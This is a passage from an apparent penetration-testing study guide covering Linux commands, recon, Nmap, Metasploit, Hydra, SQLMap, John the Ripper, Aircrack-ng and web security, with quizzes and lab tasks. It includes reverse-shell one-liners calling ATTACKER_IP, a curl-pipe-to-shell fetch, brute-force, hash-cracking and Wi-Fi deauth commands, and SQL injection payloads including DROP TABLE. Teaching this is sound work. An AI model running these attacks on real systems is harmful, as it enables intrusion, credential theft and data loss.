grep "pattern" file.txt         # Search for pattern in file
grep -r "password" /etc/        # Recursive search
grep -i "error" log.txt         # Case-insensitive search
find / -name "*.conf" 2>/dev/null  # Find files by name
find / -user root -perm -4000   # Find SUID root files
locate filename                  # Fast file location (uses database)
which nmap                       # Find location of a command
```

**Text Processing:**
```bash
cat file.txt | sort              # Sort lines
cat file.txt | uniq              # Remove duplicate lines
cat file.txt | wc -l             # Count lines
awk '{print $1}' file.txt        # Print first column
sed 's/old/new/g' file.txt       # Replace text
cut -d':' -f1 /etc/passwd        # Extract field from delimited file
```

**System Information:**
```bash
whoami                  # Current username
id                      # User ID, group memberships
hostname                # System hostname
uname -a                # OS and kernel version
ps aux                  # All running processes
top                     # Live process monitor
htop                    # Enhanced process monitor
df -h                   # Disk usage
free -h                 # Memory usage
env                     # Environment variables
history                 # Command history
sudo -l                 # List sudo privileges (key for privesc)
```

**Quick Revision**
- `grep -r "pattern" /` = search entire filesystem
- `find / -perm -4000` = find SUID files
- `sudo -l` = see what commands current user can run as root
- `ps aux` = all running processes
- `tail -f logfile` = live log monitoring


## Networking Commands

**Definition**
Linux networking commands are used to configure, diagnose, and analyze network interfaces and connectivity.

**Important Points**

```bash
# Interface information
ip addr                 # Show IP addresses (modern)
ifconfig                # Show interfaces (legacy)
ip link show            # Show network interfaces

# Connectivity testing
ping 8.8.8.8            # Test reachability (ICMP)
ping -c 4 google.com    # Ping 4 times then stop
traceroute google.com   # Trace route to host
mtr google.com          # Continuous traceroute (better)

# DNS queries
nslookup google.com     # DNS lookup
dig google.com          # Detailed DNS query
dig google.com ANY      # All DNS records
dig -x 8.8.8.8          # Reverse DNS lookup
host google.com         # Simple DNS lookup

# Routing
ip route                # Show routing table
route -n                # Show routing table (legacy)

# Active connections
ss -tulpn               # Show all listening ports/connections (modern)
netstat -tulpn          # Show listening ports (legacy)
netstat -an             # All connections and their states

# Network scanning (basic)
arp -a                  # Show ARP cache (local network devices)

# Downloading files
wget http://example.com/file.txt   # Download file
curl -I http://example.com         # HTTP headers only
curl -X POST -d "data" http://...  # HTTP POST request

# Firewall (iptables/nftables)
iptables -L             # List firewall rules
ufw status              # Ubuntu firewall status
ufw allow 22            # Allow SSH
```

**Quick Revision**
- `ip addr` = modern `ifconfig`
- `ss -tulpn` = modern `netstat -tulpn` (listening ports)
- `dig` = most detailed DNS tool
- `curl` = make HTTP requests from terminal (essential for web testing)
- `netstat -an` = see all active connections


## SSH

**Definition**
SSH (Secure Shell) is a cryptographic network protocol for secure remote login and command execution over an unsecured network, replacing insecure Telnet.

**Key Explanation**
- Uses public-key cryptography for authentication and encryption
- Port 22 by default
- Essential for managing remote Linux servers securely

**Important Points**
```bash
# Connect to remote server
ssh username@ip_address
ssh -p 2222 username@ip_address     # Non-default port

# SSH key generation
ssh-keygen -t rsa -b 4096           # Generate RSA key pair
ssh-keygen -t ed25519               # Generate Ed25519 key (more secure)

# Copy public key to remote server
ssh-copy-id username@ip_address

# SSH tunneling (port forwarding)
ssh -L 8080:localhost:80 user@remote  # Local port forward
ssh -R 8080:localhost:80 user@remote  # Remote port forward
ssh -D 1080 user@remote               # Dynamic SOCKS proxy

# SCP (Secure Copy)
scp file.txt user@remote:/path/       # Upload file
scp user@remote:/path/file.txt .      # Download file

# SSH config file (~/.ssh/config)
Host myserver
    HostName 192.168.1.100
    User admin
    Port 22
    IdentityFile ~/.ssh/id_rsa
```

- **SSH keys:** Private key stays on your machine, public key goes on the server
- Private key should have `chmod 600` permissions
- Disable password authentication and use key-only auth for production servers
- `~/.ssh/known_hosts` = trusted server fingerprints

**Quick Revision**
- SSH = encrypted remote shell (replaces insecure Telnet)
- Port 22 | Uses RSA/Ed25519 key pairs
- `ssh-keygen` = generate keys | `ssh-copy-id` = deploy public key
- SSH tunneling = forward ports through encrypted tunnel
- Always disable SSH password auth on production servers


## Users and Privileges

**Definition**
Linux user management controls who can access the system and what they can do, with a strict permission hierarchy.

**Important Points**
```bash
# User management
cat /etc/passwd         # All users (username:x:UID:GID:info:home:shell)
cat /etc/shadow         # Password hashes (root only)
cat /etc/group          # Groups

adduser newuser         # Create new user (interactive)
useradd -m -s /bin/bash newuser  # Create user (manual)
passwd username         # Set/change password
userdel -r username     # Delete user and home directory

# Group management
groupadd groupname      # Create group
usermod -aG groupname user  # Add user to group
groups username         # Show user's groups

# Privilege escalation
sudo command            # Run command as root
sudo -i                 # Interactive root shell
su - username           # Switch user
sudo visudo             # Edit sudoers file safely

# Check current user info
id                      # UID, GID, groups
whoami                  # Username
sudo -l                 # What can this user sudo?
```

- **UID 0 = root** (superuser)
- **Sudoers file** (`/etc/sudoers`) controls who can use `sudo`
- **Privilege escalation** = finding ways to go from low-privileged to root

**Quick Revision**
- /etc/passwd = user list | /etc/shadow = password hashes
- UID 0 = root | sudo = run as root
- `sudo -l` = check sudo privileges (critical for privesc)
- GTFOBins (gtfobins.github.io) = list of sudo/SUID privesc techniques


## Logs in Linux

**Definition**
Linux logs are files that record system events, errors, and user activity, essential for security monitoring and incident response.

**Important Points**

| Log File | Contents |
|---|---|
| `/var/log/syslog` | General system messages |
| `/var/log/auth.log` | Authentication events (SSH logins, sudo) |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/apache2/access.log` | Web server access logs |
| `/var/log/apache2/error.log` | Web server error logs |
| `/var/log/fail2ban.log` | Fail2ban blocked IPs |
| `/var/log/dpkg.log` | Package installation history |
| `/var/log/wtmp` | Login history (read with `last`) |

```bash
# Viewing logs
cat /var/log/auth.log             # View auth log
tail -f /var/log/syslog           # Live system log
grep "Failed password" /var/log/auth.log  # Find failed SSH logins
grep "Accepted" /var/log/auth.log         # Find successful logins
journalctl -xe                    # Systemd journal (modern systems)
journalctl -u ssh                 # SSH service logs
last                              # Login history
lastlog                           # Last login per user
w                                 # Currently logged in users
```

**Security relevance:**
- Logs are the primary source for incident response
- Attackers often try to clear or manipulate logs
- SIEM tools aggregate and analyze logs from multiple sources
- Linux log rotation: `/etc/logrotate.conf`

**Quick Revision**
- `/var/log/auth.log` = authentication events (most security-relevant)
- `tail -f` = live log monitoring
- `grep "Failed password"` = find brute force attempts
- Attackers target logs to cover tracks
- SIEM = centralized log analysis platform


## MODULE 3 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Boot Kali Linux (VM), navigate to /etc, find the passwd and shadow files
2. Create a user, set a password, add them to sudo group, then delete them
3. Create a script `hello.sh`, make it executable, run it
4. Find all SUID files on the system: `find / -perm -4000 2>/dev/null`
5. SSH into TryHackMe's machines (requires VPN) and navigate the file system
6. Read auth.log and find the last 5 login events

**MCQs**
1. Which file contains Linux user password hashes?
   - a) /etc/passwd  **b) /etc/shadow**  c) /etc/group  d) /etc/users

2. What does `chmod 600` represent?
   - a) rwxrwxrwx  b) rwxr-xr-x  **c) rw-------**  d) rw-r--r--

3. Which command shows all listening TCP/UDP ports?
   - a) ip addr  **b) ss -tulpn**  c) ps aux  d) top

4. What is the default SSH port?
   - a) 21  **b) 22**  c) 23  d) 25

5. What does `sudo -l` show?
   - a) List of all users  b) Sudo logs  **c) Commands current user can run with sudo**  d) Running processes

---

# MODULE 4 — ETHICAL HACKING BASICS

## Penetration Testing Lifecycle

**Definition**
Penetration testing (pentesting) is an authorized simulated cyber attack on a computer system, performed to evaluate its security.

**Key Explanation**
- Pentesting follows a structured methodology to ensure thoroughness and reproducibility
- All pentesting requires explicit written authorization (Rules of Engagement)
- The lifecycle ensures no phase is skipped, reducing chance of missing vulnerabilities

**Important Points**

```
PENTEST LIFECYCLE
+─────────────────────────────────────────────────────────+
│  1. Planning & Reconnaissance                            │
│     └── Define scope, rules of engagement, gather info   │
│  2. Scanning & Enumeration                               │
│     └── Active probing, identify services, open ports    │
│  3. Vulnerability Assessment                             │
│     └── Identify weaknesses in discovered services       │
│  4. Exploitation                                         │
│     └── Attempt to exploit vulnerabilities               │
│  5. Post-Exploitation                                    │
│     └── Maintain access, pivot, privilege escalation     │
│  6. Reporting                                            │
│     └── Document findings, risk ratings, remediation     │
+─────────────────────────────────────────────────────────+
```

- **Scope**: Defines exactly what systems/networks are in scope (must never exceed this)
- **Rules of Engagement (RoE)**: Written agreement defining what is permitted
- **Types of pentest:**
  - **Black Box**: No prior knowledge of target (simulates external attacker)
  - **White Box**: Full knowledge provided (source code, architecture)
  - **Grey Box**: Partial knowledge (most common — user credentials, network diagram)

**Quick Revision**
- Always get written authorization before any test
- Black = no info | White = full info | Grey = partial info
- 6 phases: Planning → Scanning → Vuln Assessment → Exploitation → Post-Exploitation → Reporting
- Scope creep = testing systems outside the agreed scope (illegal)


## Reconnaissance

**Definition**
Reconnaissance (recon) is the first phase of penetration testing — gathering as much information as possible about the target without directly interacting with it.

**Key Explanation**
- **Passive Recon**: Gathering info without touching the target (Google, WHOIS, LinkedIn)
- **Active Recon**: Directly interacting with the target (scanning, pinging)
- More recon = better attack planning = higher success rate
- Attackers spend 70% of their time in recon

**Important Points**

**Passive Recon Techniques:**
```bash
# WHOIS lookup (domain registration info)
whois example.com

# DNS enumeration
dig example.com ANY
fierce --domain example.com    # Subdomain brute force
theHarvester -d example.com -b google  # Email/subdomain gathering

# Google Dorking (OSINT via Google)
site:example.com                    # All pages on domain
filetype:pdf site:example.com       # PDF files on domain
intitle:"index of" site:example.com # Directory listings
inurl:admin site:example.com        # Admin pages

# Certificate transparency logs
crt.sh                              # Find subdomains via SSL certs

# Shodan (search engine for internet-connected devices)
shodan search "apache 2.4.49"       # Find vulnerable Apache servers

# LinkedIn/social engineering recon
# Find employees, technology stack, email formats
```

**Active Recon Tools:**
```bash
nmap -sn 192.168.1.0/24    # Ping sweep (find live hosts)
nmap -sV 192.168.1.100     # Service/version detection
```

**OSINT Framework:** osintframework.com — comprehensive list of OSINT tools

**Quick Revision**
- Passive = no target contact | Active = direct interaction
- Google Dorks = powerful passive recon technique
- Shodan = search engine for exposed devices
- crt.sh = find subdomains via SSL certificate logs
- theHarvester = automated email/subdomain gathering


## Scanning & Enumeration

**Definition**
Scanning is the process of discovering hosts, open ports, and services on a network. Enumeration extracts detailed information about discovered services.

**Key Explanation**
- Scanning identifies what exists; enumeration identifies what can be exploited
- Nmap is the primary tool for both

**Important Points**

**Nmap scan types:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24         # Ping scan (no port scan)

# Port scanning
nmap 192.168.1.100              # Default TCP scan (top 1000 ports)
nmap -p 1-65535 192.168.1.100   # Full port scan
nmap -p 80,443,22 192.168.1.100 # Specific ports

# Service and version detection
nmap -sV 192.168.1.100          # Service version detection
nmap -sV -sC 192.168.1.100      # + default scripts

# OS detection
nmap -O 192.168.1.100           # OS fingerprinting

# Aggressive scan (all at once)
nmap -A 192.168.1.100           # OS + version + scripts + traceroute

# Stealth scan (avoid detection)
nmap -sS 192.168.1.100          # SYN scan (half-open, quieter)

# UDP scan
nmap -sU 192.168.1.100          # UDP port scan (slow)

# Output to file
nmap -oN output.txt 192.168.1.100    # Normal output
nmap -oX output.xml 192.168.1.100    # XML output
nmap -oG output.gnmap 192.168.1.100  # Grepable output
```

**Enumeration by service:**
```bash
# SMB enumeration (Windows file sharing)
enum4linux -a 192.168.1.100     # SMB enumeration
smbclient -L \\192.168.1.100    # List SMB shares

# Web directory enumeration
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirb http://192.168.1.100       # Alternative web dir scanner

# SNMP enumeration
snmpwalk -c public 192.168.1.100 -v1  # SNMP community string

# DNS zone transfer (if misconfigured)
dig axfr @nameserver domain.com
```

**Quick Revision**
- Nmap = primary scanning tool
- `-sV` = version detection | `-sC` = default scripts | `-A` = aggressive
- `-sS` = SYN scan (stealth) | `-sU` = UDP scan
- Gobuster/dirb = web directory enumeration
- enum4linux = SMB/NetBIOS enumeration


## Vulnerability Assessment

**Definition**
Vulnerability assessment is the process of identifying, quantifying, and prioritizing vulnerabilities in a system.

**Key Explanation**
- Different from exploitation — VA identifies weaknesses without exploiting them
- Uses automated scanners + manual analysis
- Results are rated by severity (Critical/High/Medium/Low)

**Important Points**
```bash
# Nikto (web vulnerability scanner)
nikto -h http://192.168.1.100
nikto -h https://192.168.1.100 -ssl

# OpenVAS (comprehensive network VA scanner)
# Run via browser at https://localhost:9392 after setup

# Nmap vulnerability scripts
nmap --script vuln 192.168.1.100        # Run all vuln scripts
nmap --script smb-vuln-* 192.168.1.100  # SMB-specific vuln scripts

# Searchsploit (search Exploit-DB locally)
searchsploit apache 2.4.49              # Find exploits for Apache 2.4.49
searchsploit -m 50383                   # Copy exploit to current dir
```

- **CVE** = unique identifier for a vulnerability (e.g., CVE-2021-44228)
- **CVSS Score** = numerical severity rating (0–10)
- **Exploit-DB** (exploit-db.com) = database of public exploits
- **NVD** (nvd.nist.gov) = National Vulnerability Database

**Quick Revision**
- VA = find and rate vulnerabilities (no exploitation)
- Nikto = web app scanner | OpenVAS = network scanner
- searchsploit = offline exploit database search
- CVSS 9–10 = Critical | 7–8.9 = High | 4–6.9 = Medium


## Exploitation Basics

**Definition**
Exploitation is the act of leveraging a vulnerability to gain unauthorized access or execute code on a target system.

**Key Explanation**
- Only performed with explicit authorization
- Uses vulnerabilities identified in the VA phase
- Metasploit Framework is the most commonly used exploitation tool

**Important Points**
```bash
# Metasploit Framework basics
msfconsole              # Launch Metasploit

# Inside msfconsole:
search eternalblue          # Search for modules
use exploit/windows/smb/ms17_010_eternalblue  # Select module
show options                # See required parameters
set RHOSTS 192.168.1.100    # Set target IP
set LHOST 192.168.1.10      # Set attacker IP (for reverse shell)
set LPORT 4444              # Set listener port
run                         # Execute the exploit

# Manual exploitation with searchsploit
searchsploit apache 2.4.49
searchsploit -m 50383       # Copy exploit
python3 50383.py http://target/  # Run exploit
```

**Types of shells:**
- **Bind shell**: Target opens a port, attacker connects to it
- **Reverse shell**: Target connects back to attacker (bypasses inbound firewall)
- **Meterpreter**: Advanced Metasploit shell with many built-in commands

**Common reverse shell one-liners:**
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Netcat listener (on attacker)
nc -lvnp 4444
```

**Quick Revision**
- Metasploit = primary exploitation framework
- Reverse shell = target connects to attacker (better for firewalls)
- Bind shell = attacker connects to target
- Meterpreter = advanced post-exploitation shell
- ALWAYS operate within authorized scope


## Post-Exploitation

**Definition**
Post-exploitation refers to actions taken after initial access is gained, including maintaining access, escalating privileges, lateral movement, and data exfiltration.

**Key Explanation**
- The goal is to simulate what a real attacker would do after gaining initial access
- Documents the full impact of a compromise for the report
- Key activities: privilege escalation, persistence, lateral movement, data collection

**Important Points**
```bash
# Privilege escalation Linux
sudo -l                              # Check sudo rights
find / -perm -4000 2>/dev/null       # Find SUID binaries
cat /etc/crontab                     # Check cron jobs
ls -la /etc/cron*                    # All cron directories
uname -a                             # Kernel version (check for kernel exploits)
cat /etc/passwd | grep -v nologin    # Users with shell access

# Automated privesc enumeration
# LinPEAS: upload and run linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Meterpreter post-exploitation
getuid                    # Current user
getsystem                 # Attempt privilege escalation
hashdump                  # Dump password hashes
sysinfo                   # System information
run post/multi/recon/local_exploit_suggester  # Find local exploits

# Maintaining persistence
# (Document, don't actually implement unless authorized)
crontab -e               # Add persistent cron job
```

- **GTFOBins** (gtfobins.github.io) = Linux privilege escalation via misconfigurations
- **WinPEAS/LinPEAS** = automated privilege escalation enumeration scripts
- **Lateral movement** = moving from one compromised machine to others on the network
- **Pivoting** = using a compromised host to attack other network segments

**Quick Revision**
- Privesc = going from user → root/admin
- `sudo -l` and SUID files are primary Linux privesc vectors
- LinPEAS automates privilege escalation enumeration
- Lateral movement = spreading through the network
- Document everything for the report


## Reporting

**Definition**
A penetration test report is the professional deliverable that communicates findings, risks, and remediation recommendations to the client.

**Key Explanation**
- The report is the most important output of a pentest
- Must be clear enough for both technical staff and executives to understand
- Quality of reporting differentiates professional pentesters

**Important Points**

**Report Structure:**
```
1. Executive Summary
   - High-level findings for management
   - Risk rating overview
   - Business impact
   
2. Scope & Methodology
   - What was tested, when, how
   - Testing approach used
   
3. Findings Summary
   - Table of all findings with severity ratings
   
4. Detailed Findings (per vulnerability)
   - Title
   - Severity (Critical/High/Medium/Low/Info)
   - CVSS Score
   - Description
   - Evidence (screenshots, output)
   - Impact
   - Recommendation
   - References (CVE, CWE)
   
5. Appendices
   - Raw scan output
   - Tool versions
   - Methodology details
```

- **CVSS** = Common Vulnerability Scoring System (rate each finding 0–10)
- **CWE** = Common Weakness Enumeration (category of vulnerability type)
- Good reports have clear evidence (screenshots) and specific, actionable remediation
- Use tools like Dradis or Pwndoc for report writing

**Quick Revision**
- Report = most important pentest deliverable
- Two audiences: Executive (non-technical) and Technical staff
- Every finding needs: Description, Evidence, Impact, Recommendation
- CVSS scores vulnerabilities | CWE categorizes vulnerability types


## MODULE 4 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. On TryHackMe: Complete "Blue" room (EternalBlue/MS17-010 exploitation)
2. Set up Metasploitable 2 VM, scan with Nmap, identify top 5 vulnerabilities
3. Use searchsploit to find exploits for vsftpd 2.3.4 (a Metasploitable service)
4. Write a mini pentest report for any TryHackMe machine you compromise
5. Use LinPEAS on a TryHackMe Linux machine and document findings

**MCQs**
1. What does a grey box penetration test mean?
   - a) No info given  **b) Partial information provided**  c) Full access given  d) Only web app testing

2. Which Nmap flag enables OS detection?
   - a) -sV  b) -sC  **c) -O**  d) -A

3. Which shell type has the target connecting back to the attacker?
   - a) Bind shell  **b) Reverse shell**  c) Web shell  d) Meterpreter

4. What is the purpose of LinPEAS?
   - a) Network scanning  **b) Linux privilege escalation enumeration**  c) Password cracking  d) Web scanning

5. Which document defines what is allowed during a pentest?
   - a) NDA  b) CVE  **c) Rules of Engagement**  d) Scope document

---

# MODULE 5 — CYBERSECURITY TOOLS

## Nmap

**Definition**
Nmap (Network Mapper) is an open-source network scanning tool used for host discovery, port scanning, service detection, and OS fingerprinting.

**Key Explanation**
- The most widely used network reconnaissance tool
- Pre-installed on Kali Linux
- Used by both defenders (network audits) and attackers (recon)

**Installation & Usage:**
```bash
# Installation
sudo apt install nmap        # Debian/Kali
brew install nmap            # macOS

# Core scan types
nmap 192.168.1.1             # Basic scan (top 1000 TCP ports)
nmap -p- 192.168.1.1         # All 65535 ports
nmap -sV 192.168.1.1         # Service version detection
nmap -sC 192.168.1.1         # Default NSE scripts
nmap -A 192.168.1.1          # Aggressive (OS + version + scripts + trace)
nmap -O 192.168.1.1          # OS detection
nmap -sS 192.168.1.1         # TCP SYN (stealth) scan
nmap -sU 192.168.1.1         # UDP scan
nmap -sn 192.168.1.0/24      # Ping sweep
nmap -Pn 192.168.1.1         # Skip ping (assume host is up)
nmap -T4 192.168.1.1         # Faster timing (T0=slowest, T5=fastest)

# Output formats
nmap -oN output.txt 192.168.1.1      # Normal text
nmap -oX output.xml 192.168.1.1      # XML
nmap -oA allformats 192.168.1.1      # All formats

# NSE (Nmap Scripting Engine)
nmap --script vuln 192.168.1.1           # All vulnerability scripts
nmap --script http-title 192.168.1.1     # Get HTTP titles
nmap --script smb-os-discovery 192.168.1.1  # SMB OS detection
nmap --script banner 192.168.1.1         # Service banners
```

**Common use case:** `nmap -sV -sC -p- --min-rate 5000 <target>` — full port scan with scripts, fast


## Wireshark

**Definition**
Wireshark is a network protocol analyzer that captures and analyzes packets in real time, essential for network troubleshooting and security analysis.

**Key Usage:**
```
Capture filter (before capture):  port 80
                                   host 192.168.1.1
                                   
Display filter (after capture):   http
                                   ip.addr == 192.168.1.1
                                   tcp.port == 443
                                   dns
                                   tcp.flags.syn == 1
                                   http.request.method == "POST"
                                   frame contains "password"
```

**Key features:**
- **Follow TCP Stream**: Right-click packet → Follow → TCP Stream
- **Export Objects**: File → Export Objects → HTTP (extract files from capture)
- **Statistics → Protocol Hierarchy**: Overview of all protocols in capture
- **Statistics → Conversations**: Top talkers
- **Colorization**: Different colors for different protocols/issues

**Security uses:**
- Detect plaintext credentials in HTTP traffic
- Identify malware C2 communications
- Analyze suspicious DNS queries
- Detect ARP poisoning / MitM attacks


## Burp Suite

**Definition**
Burp Suite is a web application security testing platform used to intercept, analyze, and manipulate HTTP/HTTPS traffic between a browser and web server.

**Key Explanation**
- Acts as a proxy between your browser and the web server
- Allows you to intercept, modify, and replay web requests
- Industry-standard tool for web application penetration testing

**Key Modules:**
```
Proxy      → Intercept and modify HTTP requests/responses
Intruder   → Automated customized attacks (fuzzing, brute force)
Repeater   → Manually modify and resend requests
Scanner    → Automated vulnerability scanning (Pro only)
Decoder    → Encode/decode data (Base64, URL, HTML, etc.)
Comparer   → Compare two requests/responses
Sequencer  → Analyze randomness of tokens
```

**Setup:**
1. Launch Burp Suite
2. Go to Proxy → Options → set listener to 127.0.0.1:8080
3. Configure browser to use proxy 127.0.0.1:8080
4. Install Burp CA certificate in browser (for HTTPS)
5. Turn "Intercept On" to capture requests

**Common tasks:**
```
# Intercept login request → modify credentials
# Send to Intruder → brute force password field
# Send to Repeater → test for SQLi/XSS manually
# Use Decoder to decode Base64 session tokens
```


## Metasploit Framework

**Definition**
Metasploit is an open-source penetration testing framework that provides tools for developing, testing, and executing exploits.

**Key Modules:**
```
Exploit    → Code that takes advantage of vulnerability
Payload    → Code that runs after exploit succeeds
Auxiliary  → Scanning, fuzzing, sniffing modules
Post       → Post-exploitation modules
Encoder    → Obfuscate payload to avoid AV detection
```

**Essential commands:**
```bash
msfconsole              # Launch Metasploit
msfdb init              # Initialize database
db_nmap -sV 192.168.1.100  # Nmap scan stored in MSF DB

# Module workflow
search ms17_010         # Find relevant module
use exploit/windows/smb/ms17_010_eternalblue
info                    # Module information
show options            # Required/optional parameters
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
run                     # Execute

# Meterpreter commands (after exploitation)
sysinfo                 # System information
getuid                  # Current user
getsystem               # Privilege escalation attempt
hashdump                # Dump NTLM hashes
shell                   # Drop to system shell
download file.txt       # Download file
upload exploit.exe      # Upload file
run post/multi/recon/local_exploit_suggester  # Find privesc
```


## Hydra

**Definition**
Hydra is a fast, parallelized login cracker that supports numerous protocols (SSH, FTP, HTTP, SMB, etc.) for brute force attacks.

**Key Usage:**
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP brute force with username list
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form brute force
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"

# Web basic auth
hydra -l admin -P rockyou.txt 192.168.1.100 http-get /admin

# Multiple targets
hydra -l admin -P rockyou.txt -M targets.txt ssh

# Common options
-l username     # Single username
-L file         # Username list
-p password     # Single password  
-P file         # Password list
-t 4            # Threads (default 16)
-V              # Verbose (show attempts)
-f              # Stop after first valid pair
```


## Nikto

**Definition**
Nikto is an open-source web server scanner that tests for over 6,700 potentially dangerous files, outdated server software, and common security issues.

**Key Usage:**
```bash
# Basic scan
nikto -h http://192.168.1.100

# HTTPS
nikto -h https://192.168.1.100 -ssl

# Specific port
nikto -h 192.168.1.100 -p 8080

# Save output
nikto -h http://192.168.1.100 -o report.txt -Format txt

# Scan through proxy (Burp Suite)
nikto -h http://192.168.1.100 -useproxy http://127.0.0.1:8080
```

**What Nikto finds:**
- Server version disclosures
- Default files and directories
- Outdated software versions
- Misconfigurations
- Potentially dangerous HTTP methods (PUT, DELETE)
- Cookie flags (missing HttpOnly, Secure)


## SQLMap

**Definition**
SQLMap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities.

**Key Usage:**
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login" --data "user=admin&pass=test"

# From Burp request file
sqlmap -r request.txt

# Detect and enumerate databases
sqlmap -u "http://target.com/?id=1" --dbs

# List tables in a database
sqlmap -u "http://target.com/?id=1" -D database_name --tables

# Dump table data
sqlmap -u "http://target.com/?id=1" -D database_name -T users --dump

# Attempt to get OS shell
sqlmap -u "http://target.com/?id=1" --os-shell

# Common options
--level=5         # More aggressive testing
--risk=3          # Higher risk tests
--batch           # Don't ask for user input
--random-agent    # Random User-Agent
--tor             # Use Tor network
```


## John the Ripper

**Definition**
John the Ripper is a password cracking tool that uses dictionary attacks, brute force, and rainbow table attacks to crack password hashes.

**Key Usage:**
```bash
# Basic crack (auto-detect hash type)
john hashes.txt

# Dictionary attack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify hash format
john --format=md5 --wordlist=rockyou.txt hashes.txt
john --format=bcrypt hashes.txt
john --format=NT hashes.txt          # Windows NTLM

# Show cracked passwords
john --show hashes.txt

# List supported formats
john --list=formats

# Crack /etc/shadow (Linux)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# Crack ZIP password
zip2john protected.zip > zip.hash
john zip.hash

# Crack SSH private key passphrase
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
```

- **rockyou.txt** = most common wordlist, located at `/usr/share/wordlists/rockyou.txt` on Kali


## Aircrack-ng

**Definition**
Aircrack-ng is a network security toolset for monitoring, attacking, testing, and cracking Wi-Fi networks (WEP, WPA, WPA2).

**Key Usage:**
```bash
# Step 1: Check wireless interface
iwconfig
airmon-ng

# Step 2: Enable monitor mode
airmon-ng start wlan0         # Creates wlan0mon

# Step 3: Capture packets
airodump-ng wlan0mon          # List all networks
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c = channel, --bssid = target AP MAC, -w = output file

# Step 4: Capture WPA handshake (deauth attack)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: Crack the handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

**Legal note:** Only test on networks you own or have explicit written permission to test.


## MODULE 5 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Run full Nmap scan against Metasploitable 2, document all findings
2. Set up Burp Suite, intercept a login request on DVWA, send to Repeater
3. Use SQLMap against DVWA's SQL injection challenge
4. Use Hydra to brute force DVWA's login (username: admin, password: password)
5. Run Nikto against DVWA and document what it finds
6. Use John the Ripper to crack the hash: `5f4dcc3b5aa765d61d8327deb882cf99` (MD5)

**MCQs**
1. Which Nmap flag performs service version detection?
   - a) -O  **b) -sV**  c) -sC  d) -T4

2. What does Burp Suite's Repeater module do?
   - a) Automates brute force  **b) Manually resend and modify requests**  c) Decodes tokens  d) Scans for vulnerabilities

3. Which tool automates SQL injection detection?
   - a) Nikto  b) Hydra  **c) SQLMap**  d) Nmap

4. What wordlist is most commonly used in Kali Linux?
   - a) passwords.txt  **b) rockyou.txt**  c) common.txt  d) darkweb2017.txt

---

# MODULE 6 — WEB SECURITY

## OWASP Top 10

**Definition**
The OWASP Top 10 is a standard awareness document for web application security, representing the most critical security risks to web applications, updated every few years.

**OWASP Top 10 (2021):**

| Rank | Vulnerability | Description |
|---|---|---|
| A01 | **Broken Access Control** | Users can act outside their intended permissions |
| A02 | **Cryptographic Failures** | Sensitive data exposed due to weak/missing encryption |
| A03 | **Injection** | SQL, NoSQL, command, LDAP injection attacks |
| A04 | **Insecure Design** | Security flaws in application architecture |
| A05 | **Security Misconfiguration** | Default configs, unnecessary features enabled |
| A06 | **Vulnerable & Outdated Components** | Using components with known vulnerabilities |
| A07 | **Authentication Failures** | Weak auth, session management flaws |
| A08 | **Software & Data Integrity Failures** | CI/CD pipeline, deserialization issues |
| A09 | **Logging & Monitoring Failures** | Insufficient logging, slow breach detection |
| A10 | **SSRF** | Server-Side Request Forgery |

**Quick Revision**
- A01 (Broken Access Control) = most common web vulnerability in 2021
- A03 (Injection) = SQLi, XSS are injection types
- OWASP = Open Web Application Security Project (owasp.org)
- WebGoat, DVWA = practice platforms for OWASP vulnerabilities


## SQL Injection

**Definition**
SQL Injection (SQLi) is a code injection technique where malicious SQL code is inserted into input fields to manipulate the database query.

**Key Explanation**
- Occurs when user input is directly included in SQL queries without sanitization
- Can allow: data extraction, authentication bypass, data modification, OS command execution

**Important Points**

```sql
-- Vulnerable PHP code
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

-- Normal input:    admin / password123
-- Query becomes:  SELECT * FROM users WHERE username='admin' AND password='password123'

-- SQLi payload:   admin' -- (comment out rest)  
-- Query becomes:  SELECT * FROM users WHERE username='admin' --' AND password='...'
-- Result:         Logs in as admin without knowing password!

-- Extract all users:  ' OR '1'='1
-- Query:  SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

**Types of SQLi:**
- **In-band** (Error-based, Union-based): Response visible directly
- **Blind** (Boolean, Time-based): No direct response, infer from behavior
- **Out-of-band**: Data extracted via DNS/HTTP callbacks

**Testing manually:**
```
' OR 1=1 --
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT username, password FROM users --
```

**Prevention:**
- Use **parameterized queries / prepared statements** (never string concatenation)
- Input validation and sanitization
- Principle of least privilege for DB accounts
- WAF as additional layer

**Quick Revision**
- SQLi = injecting SQL into vulnerable queries
- `' OR 1=1 --` = classic SQLi payload
- Prevention = parameterized queries (not sanitization alone)
- SQLMap automates SQLi detection and exploitation


## Cross-Site Scripting (XSS)

**Definition**
XSS is a client-side injection attack where malicious scripts are injected into web pages viewed by other users.

**Key Explanation**
- Attacker injects JavaScript into a page that other users view
- The victim's browser executes the attacker's script
- Can steal cookies, redirect users, deface websites, keylog

**Types:**
